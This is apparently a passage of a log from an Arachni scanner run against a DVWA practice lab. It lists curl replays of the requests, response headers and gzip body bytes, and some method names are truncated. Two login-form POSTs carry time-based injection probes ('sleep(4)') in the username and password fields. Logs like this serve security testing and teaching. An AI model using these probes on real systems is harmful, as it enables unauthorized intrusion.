# Thu Feb 27 02:33:00.684897 2020 - pid 12844 - client 192.168.8.104:57940
Expected request entry, line 385096
curl -v \
--header "User-agent:" --header "Accept:" \
--request "ET" \
--header "Accept-Encoding: gzip, deflate" \
--header "User-Agent: Arachni/v1.4" \
--header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
--header "Accept-Language: en-US,en;q=0.8,he;q=0.6" \
--header "Cookie: PHPSESSID=4494qtkdkef667tl02vmv9dsqv;security=low" \
http://192.168.8.104/DVWA/login.php

# Thu Feb 27 02:33:00.685769 2020 - pid 12844 - client 192.168.8.104:57940
# HTTP/1.1 200 OK
# Date: Thu, 27 Feb 2020 07:33:00 GMT
# Server: Apache/2.4.41 (Debian)
# Expires: Tue, 23 Jun 2009 12:00:00 GMT
# Cache-Control: no-cache, must-revalidate
# Pragma: no-cache
# Vary: Accept-Encoding
# Content-Encoding: gzip
# Content-Length: 726
# Content-Type: text/html;charset=utf-8
# \x1f\x8b\b
# \xa5T]O\xdb0\x14}\x06\x89\xffp\xf1K7\xa4\xc4\r\x8c\x96\xb2$\x12k\x8b\x86TF\x05)lO\xc8\x8d\xdd\xc6j\x12{\xb1\xdb\xc2~\xfd\xec$\xfd\xa2}\x98\xb4\x17\xeb\xfa\xe3\x9es|}|O\x8e\xfd\xd3\xdeC7\xfa5\xecC\xa2\xb3\x14\x86\xa3o\x83\
xbb. \x07\xe3\x97\x8b.\xc6\xbd\xa8\x07?\xbfG\xf7\x03\xf0\xdc&<\xe9\x82\xc7\x1a\xe3\xfe\x0f\x04(\xd1Z^c\xbc\\.\xdd\xe5\x85+\x8a)\x8e\x1e\xf1\x9bE\xf1lZ\x1d:\xaa\xccq\xa9\xa6(<9>9\xf6K\x9e\xb7,\xcdUp
# \xae\xa0\x9a\x0e%\x06


# Thu Feb 27 02:33:00.687462 2020 - pid 12841 - client 192.168.8.104:57954
curl -v \
--header "User-agent:" --header "Accept:" \
--request "GET" \
--header "Accept-Encoding: gzip, deflate" \
--header "User-Agent: Arachni/v1.4" \
--header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
--header "Accept-Language: en-US,en;q=0.8,he;q=0.6" \
--header "Cookie: PHPSESSID=4494qtkdkef667tl02vmv9dsqv;security=low" \
http://192.168.8.104/DVWA/login.php

# Thu Feb 27 02:33:00.688191 2020 - pid 12841 - client 192.168.8.104:57954
# HTTP/1.1 200 OK
# Date: Thu, 27 Feb 2020 07:33:00 GMT
# Server: Apache/2.4.41 (Debian)
# Expires: Tue, 23 Jun 2009 12:00:00 GMT
# Cache-Control: no-cache, must-revalidate
# Pragma: no-cache
# Vary: Accept-Encoding
# Content-Encoding: gzip
# Content-Length: 697
# Content-Type: text/html;charset=utf-8
# \x1f\x8b\b
# \xa5TQO\xdb0\x10~\x06\x89\xffp\xf8\xa5\x1bR\xe2fL@Y\x12\x89\xb5\x9d\x86TF\x05)lO\xc8I\x9c\xc6\xaa\x13{\x89\xdb\xc0~\xfd\xec&mS\xd2\x87I{\xb1\xeel\xdf\xf7}\xbe;\xdf\xc9\xb1{:\xba\x1f\x06\xbf\xa6cHU\xc6a:\xfb:\xb9\x1d\x02\xb20~>\x1fb<
# F\xf0\xf3{p7\x01\xc7\xee\xc3\xa3*X\xa40\x1e\xff@\x80R\xa5\xe45\xc6UU\xd9\xd5\xb9-\x8a9\x0e\x1e\xf0\xabAqLXcZ\xe5:\xc6\x8eU\x8c\xfc\x93\xe3\x93cw\xcd\xf3\x9a\xf1\xbc\xf4\x0e`8\x83\xc1\xa0\x0e\xad\xaf\x1f\xb9)%qm\x1e\xb9\x19U\x04L\x90E\x7f/\xd9\xcaCC\x91+\x9a++x\x93\x14AT{\x1eR\xf4Ua\x03\xf2\x05\xa2\x94\x14%U\xde,\xf8f]!\xc0\x1b(\xc5\x14\xa7\xfeD\xccY\x0e\xd7\xd70"Y\x0eOK\x9e\xd3\x82\x84\x9c\xc23\r\xe1FJ\xce"\xa2\x98\xc8\xe1\xc3\xe8\xe9\xf9\xe6#\xac\x1c\xdb\xe9\xc3\xd9\x88\xae(\x172\xd3dg.\xae\xa1\x1a\\\xce\xf2\x05\x14\x94{\xa8To\x9c\x96)\xa5
# \x81\xd2\xfa\x1aYQY"H\v\x9ax(^U\xc4\xf8\x98\x1b\x19\xf6\xfa\xa4\x11\xe8\xe2\xdd\xbb\xddP\xc4o\x8d\x19\xb3\x15\xb0\xd8CUA\xa4\xa4\x05z\xb7m\x82v\xbba\xb1\x85\x93\xbe\xcb\xb29\x94E\xd4\xd0\xb2\x8c\xcci\xc3\xfc\xa2Wa\xcb|n\xe8],\xbb\xe1X\x13\xf8\xe0\x9eZV\x87\xca\xb2\xdeih\xaa\xb0\x11\x91\x88"\x03\x12\x99,z\xa8~\xa8L%\x02]\xcbT\xe8\xebR\x94\xbb\xbb\x8c\xf2XW\xabI\xa6\xce&\t)\x07\r\xe1\xa1ei\xd8fz\xcdIF]\xbc>\xd2\x9aX.\x97\xaa\x95`\xdd\x06\x9c\x94e\xc3ukN\x11\x94\xec\x8f>\xfe\xd4G`\x82k0c!\x7f\xf7\xca\x0e\xa3\xd40\xc8\x9f\xea\xb5\x12E|\x98Q6\xa7\x07Yof\xc1\xfd\xf0\xfen:\x19\x07c\x0f\x89$\xe9
# \xd9\xc6\xb7\x84\x18\x19{\x8e\xdc\x80\x97\xcb0c:[{\x12\x9aMX\x11\xbe\xd4\xee\xba\xa57\xf0\xb5\xd3\xaa)\xdeOq\x1b\xa8\x97\xb28\xa6y\xaf\x0e\xed\x99\x14\xbd(\xb10;5t/\xe9\x87\x84^P\xe7\xf2*I\x06\x0e\xed\xd3\xd8\x198\x97\xfdp@?\x87\x03\xe7\x82\xf4v\xfdb\xaa\xdei\xa3=\xff?\rc\xeav\x84\xc3m\xfd@\xf2Xd\x8fJ\xab\xd8\xf45\xac\x1b\xb5nex\xd7\xcb\xdb\x96\xed4s"\x84\xda}(\xfd\x8bH\xf3w[\xa3\xcb\x10\xdb\x91\xb0\x97\v\xac\x7f:)\xe6z\xdc\xa0\x97\x90\x93|\x81\xfc\x7f\x1b,.&\xed"u\x7f\xdbF\x07l\x15\x1e\xb8\xb4\x1d
# \xad[\xdb\xd9\xe1\xae\x07\xa2\xff\x17
# \xe7\x92er\xf3\x05


# Thu Feb 27 02:33:00.692539 2020 - pid 12841 - client 192.168.8.104:57954
Expected request entry, line 385254
curl -v \
--header "User-agent:" --header "Accept:" \
--request "OST" \
--header "Accept-Encoding: gzip, deflate" \
--header "User-Agent: Arachni/v1.4" \
--header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
--header "Accept-Language: en-US,en;q=0.8,he;q=0.6" \
--header "Cookie: PHPSESSID=4494qtkdkef667tl02vmv9dsqv;security=low" \
--header "Content-Length: 135" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data "username=arachni_name%22%3Dsleep%284%29%3D%22&password=5543%21%25arachni_secret&Login=Login&user_token=f0bae6e178ff91e0ed19170b9e4b916a" \
http://192.168.8.104/DVWA/login.php

# Thu Feb 27 02:33:00.693630 2020 - pid 12841 - client 192.168.8.104:57954
# HTTP/1.1 302 Found
# Date: Thu, 27 Feb 2020 07:33:00 GMT
# Server: Apache/2.4.41 (Debian)
# Expires: Thu, 19 Nov 1981 08:52:00 GMT
# Cache-Control: no-store, no-cache, must-revalidate
# Pragma: no-cache
# Location: index.php
# Content-Length: 0
# Content-Type: text/html; charset=UTF-8


# Thu Feb 27 02:33:00.693825 2020 - pid 12841 - client 192.168.8.104:57954
Expected request entry, line 385328
curl -v \
--header "User-agent:" --header "Accept:" \
--request "ET" \
--header "Accept-Encoding: gzip, deflate" \
--header "User-Agent: Arachni/v1.4" \
--header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
--header "Accept-Language: en-US,en;q=0.8,he;q=0.6" \
--header "Cookie: PHPSESSID=4494qtkdkef667tl02vmv9dsqv;security=low" \
http://192.168.8.104/DVWA/index.php

# Thu Feb 27 02:33:00.696175 2020 - pid 12841 - client 192.168.8.104:57954
# HTTP/1.1 200 OK
# Date: Thu, 27 Feb 2020 07:33:00 GMT
# Server: Apache/2.4.41 (Debian)
# Expires: Tue, 23 Jun 2009 12:00:00 GMT
# Cache-Control: no-cache, must-revalidate
# Pragma: no-cache
# Vary: Accept-Encoding
# Content-Encoding: gzip
# Content-Length: 2701
# Content-Type: text/html;charset=utf-8
# \x1f\x8b\b
# \xa5Ymo\xdb8\x12\xfe\xdc\x02\xfb\x1fX}\xb8&\x8b\xc4j\xae\xf7\xe1\xdau|\xc8K\xb3\xcd\xa1IsM\xdat\x81\x02\x06-\xd1\x16\x1bJ\xd4\x92\x94\x1d\xff\xfb{f(\xd9\x8a\x93"\x9b.\xb0\xddH"9\x9c\x97g\x9e\x19\xd2\xbf<\x1f\xbe8\xfext\xf5\xc7\xc5;Q\x84\xd2\x88\x8b\xcf\x87\x1fN\x8fD\xb2\x9b\xa6\xd7\xaf\x8f\xd2\xf4\xf8\xeaX|}\x7fu\xf6A\xec\r^\x89\xcb\xe0t\x16\xd2\xf4\xddy"\x92"\x84\xfam\x9a.\x16\x8b\xc1\xe2\xf5\xc0\xbaYz\xf5)\xbd%){\xb4\xac}\xdc\xf5\xbcf\x90\x87<\x19\xfd\xf2\xfc\x97\xe7C\xde\xe7\xb64\x95\xdf\x7f@\xc6\xde\x9b7o\xe2\xd28\xfd\xd9\xb0P2\xc7\xe3\xb3g\xc3R\x05)h\xc9\xae\xfa\xb3\xd1\xf3\xfd\xe4\xc8VAUa\xf7jY\xabDd\xf1m?\t\xea6\xa4$\xe27\x91\x15\xd2y\x15\xf6?_\x9d\xec\xfe;\x11i\x94\xf9l\x18t0jt\xadLfK%\xde\xbe\x15\xc7\xb2\xac\xc4\x97\xc6T\xca\xc9\x89Q\xe2ZM\xc4A]\x1b\x9d\xc9\xa0m%\xb6\x8e\xbf\\\x1fl\x8b\xf9\xde`\xef\x95\xf8\xf5X\xcd\x95\xb1u\x89\xed~\x1d\xa6QX+\xd9\xe8\xeaF8e\xf6\x13\x1f\x96F\xf9B\xa9\x90\x88
# r\x02\x16Y\x81m\xd2\x81\xadx=:\x06\xf5\x194\x06\xca\x01c\xaf[\x8c]\x83m"\\\x82\xbcQ\x88\x99\xaf\x91\xca:f\xc6z\x1b\xc9}H\x9be
# %\xea\xb1\xef\xbf\x1a


# Thu Feb 27 02:33:00.697960 2020 - pid 12845 - client 192.168.8.104:57964
curl -v \
--header "User-agent:" --header "Accept:" \
--request "GET" \
--header "Accept-Encoding: gzip, deflate" \
--header "User-Agent: Arachni/v1.4" \
--header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
--header "Accept-Language: en-US,en;q=0.8,he;q=0.6" \
--header "Cookie: PHPSESSID=4494qtkdkef667tl02vmv9dsqv;security=low" \
http://192.168.8.104/DVWA/login.php

# Thu Feb 27 02:33:00.698848 2020 - pid 12845 - client 192.168.8.104:57964
# HTTP/1.1 200 OK
# Date: Thu, 27 Feb 2020 07:33:00 GMT
# Server: Apache/2.4.41 (Debian)
# Expires: Tue, 23 Jun 2009 12:00:00 GMT
# Cache-Control: no-cache, must-revalidate
# Pragma: no-cache
# Vary: Accept-Encoding
# Content-Encoding: gzip
# Content-Length: 698
# Content-Type: text/html;charset=utf-8
# \x1f\x8b\b
# \xa5TMo\xdb0\x0c=\xaf@\xff\x03\xabK\xb6\x02\xb6\xf2QtMg\x1b\xe8\x92\x0c+\x90\xaeA\xeb\xb4\xdb\xa9\x90-%\x16"[\x9a-'\xed~\xfd$\xdb\xf9jr\x18\xb0\x8b@J\xe2{O$\xc5\xd3\x13\xeflx?\b\x7fMF\x90\xe8T\xc0d\xfau|;
# :\xa4Q%\xf3\x05


# Thu Feb 27 02:33:00.700645 2020 - pid 12845 - client 192.168.8.104:57964
Expected request entry, line 385487
curl -v \
--header "User-agent:" --header "Accept:" \
--request "OST" \
--header "Accept-Encoding: gzip, deflate" \
--header "User-Agent: Arachni/v1.4" \
--header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
--header "Accept-Language: en-US,en;q=0.8,he;q=0.6" \
--header "Cookie: PHPSESSID=4494qtkdkef667tl02vmv9dsqv;security=low" \
--header "Content-Length: 135" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data "username=arachni_name&password=5543%21%25arachni_secret%22%3Dsleep%284%29%3D%22&Login=Login&user_token=132c827d61d3309c23e0d69409cb46ff" \
http://192.168.8.104/DVWA/login.php

# Thu Feb 27 02:33:00.701555 2020 - pid 12845 - client 192.168.8.104:57964
# HTTP/1.1 302 Found
# Date: Thu, 27 Feb 2020 07:33:00 GMT
# Server: Apache/2.4.41 (Debian)
# Expires: Thu, 19 Nov 1981 08:52:00 GMT
# Cache-Control: no-store, no-cache, must-revalidate
# Pragma: no-cache
# Location: index.php
# Content-Length: 0
# Content-Type: text/html; charset=UTF-8


# Thu Feb 27 02:33:00.701779 2020 - pid 12845 - client 192.168.8.104:57964
Expected request entry, line 385561
curl -v \
--header "User-agent:" --header "Accept:" \
--request "ET" \
--header "Accept-Encoding: gzip, deflate" \
--header "User-Agent: Arachni/v1.4" \
--header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
--header "Accept-Language: en-US,en;q=0.8,he;q=0.6" \
--header "Cookie: PHPSESSID=4494qtkdkef667tl02vmv9dsqv;security=low" \
http://192.168.8.104/DVWA/index.php

# Thu Feb 27 02:33:00.702456 2020 - pid 12845 - client 192.168.8.104:57964
# HTTP/1.1 200 OK
# Date: Thu, 27 Feb 2020 07:33:00 GMT
# Server: Apache/2.4.41 (Debian)
# Expires: Tue, 23 Jun 2009 12:00:00 GMT
# Cache-Control: no-cache, must-revalidate
# Pragma: no-cache
# Vary: Accept-Encoding
# Content-Encoding: gzip
# Content-Length: 2687
# Content-Type: text/html;charset=utf-8
# \x1f\x8b\b
# \xa5Ymo\xdb8\x12\xfe\xdc\x02\xfb\x1fX}\xb8\xb6\x8b\xc6j\xae_\xae]\xc7\x87\xbc4\xdb\x1c\x9a4W\xa7M\x178\xc0\xa0%\xdabC\x89Z\x92\xb2\xe3\x7f\x7f\xcf\x0c%[qRx\xd3\x05\xb6\x1bI$\x87\xf3\xf2\xcc3C\xfa\x97\xa7\xc3g'\x9f\x8e\xaf
\xfe\xb8|/\x8aP\x1aq\xf9\xe5\xe8\xe3\xd9\xb1H\xf6\xd2\xf4\xfa\xcdq\x9a\x9e\\\x9d\x88o\x1f\xae\xce?\x8a\xfd\xc1k1\x0eNg!M\xdf_$")B\xa8\xdf\xa5\xe9r\xb9\x1c,\xdf\x0c\xac\x9b\xa7W\x9f\xd3[\x92\xb2O\xcb\xda\xc7=\xcfk\x06y\xc8\x
93\xd1/O\x7fy:\xe4}nKS\xf9\x83\x07d\xec\xbf}\xfb6.\x8d\xd3\x9f\x0c\v%s<>y2,U\x90\x82\x96\xec\xa9?\x1b\xbd8H\x8em\x15T\x15\xf6\xaeV\xb5JD\x16\xdf\x0e\x92\xa0nCJ"~\x13Y!\x9dW\xe1\xe0\xcb\xd5\xe9\xde\xbf\x12\x91F\x99O\x86A\x07
\xa3F\xd7\xcad\xb6T\xe2\xdd;q"\xcbJ|mL\xa5\x9c\x9c\x1a%\xae\xd5T\x1c\xd6\xb5\xd1\x99\x0c\xdaV\xe2\xc5\xc9\xd7\xeb\xc3\x97b\xb1?\xd8\x7f-~=Q\vel]b\xbb_\x87i\x14\xd6J6\xba\xba\x11N\x99\x83\xc4\x87\x95Q\xbeP*$"@\xc3V\xb1\xcc\x
fbD\x14N\xcd\x0e\x92|\xb1\x94\xf4\x9e\x96RW\x03\x1eH\xef\xcb\xd10\xac\x93\xf0?]\xca\xb9J\xf1\xa9\x931\x93\v\x9a0\xe0O\xeb\xd5>s\xba\x0e\xfdm\xbf\xcb\x85\x8c_\x13\xe1]\xd6n\xfe\xdd\xa7\xf4\xf7\x12B\x07\xdf}2\x1a\xa6qN\xeb\xf
b\xb4u>=Om\xbe\x12\x99\x91\x9e\xe2\x06\xaf%1(\xb9^\b\x9d\x1f$\xe4}X\xa1\\\x1b\xb7\xde\x10\t\xe9}\x7f2\xd4\xe5\xbc\xa7\x03\x9b\xe4Sc\xe7vPW\xf3DH\x83 \xee\b\xc8\xc6Vh\x89\x8d\xeemJ.\x9d @Mo\xdf{c\x93Z\xe6\xb9\xca\xa3)\x98\xd
0\x98\xceB\x1a=26\xbb!\xa7\x18\xdd}\xf6\xca\xa8,\xd0\x8a\xa1l\x030HF\x1f\xe0\x8ea*\xe1=\xa3GO{\xd3{\xd3t\x85Lh2\xd2\xdd\x0f\xea\xa2NFg\xbd/\xbbV\x03\xc3M\x1d\x97\x8d\xe9Q\xa4\xe2\xb3\xc2Gqr\xd4[\x9a6f\xb4\xdb\x86\x9e\xd8E\x
eb_mt\xd0\x88\xc1\xd45A\xa5\xc9\xe8\x88\xfe\x8aS\xeb\xb2\x9dvm\x8bP\xb7*\x83\x84c[\x96\xb2\xca\xc5Y\xf5]\xb1\x89\x8f\x95\x93y7#9\xe3\xcf\xa7\x8f]:\xd3\xe9\xe0\xdf5@u\xa0\xab\xcc4\xb9\x8a\x8e;\xd5\x80\xd1\x19}\xf1?\xa1OS\x1b
+\xf3\xb4\x15\xf3\x85\xdf\x1em\x93\xac\x03\x18)\xe5\xd8\xab\xacqJ\x1c\x1f^^\x1d\x7f8|\xac$\xff\xa7\xd1\x103\xfe\xef\xc7\x9f\xf70\xc9\x98L\xc13\xf9\xb6$\xf1\xe2\x88>\xbf|\xac\xc4\xa5\x927\x13M\xe2\xae\xf1$\xc6\xca\x93\xa7\xc
5\xd9\xc9N|oK\xba\xf5~Br\xbe\x8d\xc7\xa0\xdeO\xe7\x8fV\x85\x04\xb8N\xc0g5\x8bi\xfbSb|'f\x1c\xac\xfb\t\x19\x99\xaf\x19\xc8\x97\xe2hUc\xf2c\xd7o\x98\x1bb\xfe\x83\x971\xbf\xfc\x9d\xbcg\xf0\xe9\xb0\x8a\x89A\xa5\r\xc1\x8a\x9fvi\
x87\x15\xba\x9a\xd9\xb8\xf2\xf2\xc3%P3\xb3\xbb\x16\xc9\xa9mB\\rH\x8f\x7fGw\xaa\x13\x9d\xb0\x8f\xfc\xbc%\xad\xe5\xf2;U\xe1\xc7%\x82\xca\xda\xa6D\xa0?\xa1\xd1vW\x1a\xeb\x97\x88a\xb1\xbf\xee\x19\x82\xdd\xd53<C\xf9\xdc\xe7e\xf5
\xe8/\xb6\x17\xda\v)\xe0\xd4\xf4|E\t\xb9\xc4,\xd9\x9b\x15
# \x19hNN\xd2\x16ki\x03q\x16\xbc k\xc4\xdcJC3\xa0\xddT\tY\t\xa9s1\xb3Nt\x11\x17\xb5\xb3\xb3\x98\x97\xd2\xf0\xbc\xa0<\x1a\x85BiL\xba\xd1\x06\x1f\x89\xb7\x83\xb5x\x82D)\x8c\x9aC\xa8\xaa\x16\xda\xd9\x8aZ\x9eW\xa2P\xa6f\xed\xf2
\xd8\b)\xe7\xb1_\b\xca\x89\xa6B\xad\xf7\x81e\x14\x8a\xb6\xcb\xb0\x9d\xf2\xc2\xceZ%\xaa\xf9\xb6a\xdd\x96\xac\xed\xd4\x86B\xf8
# )Xd\r\xb6i\x07\xb6\xe2\xcd\xe8\x04\xd4g\xd0\x18(\x07\x8c\xbdi1v\r\xb6\x89p\t\xf2F!f\xbeF*\xeb\x98\x19\x9bm$\xf7!m\x96\x01\x1c(W\x94\xb7>\xe6\xbb\xbc\xd7\xfa
# r\xc5'\x12\xa3\x1a

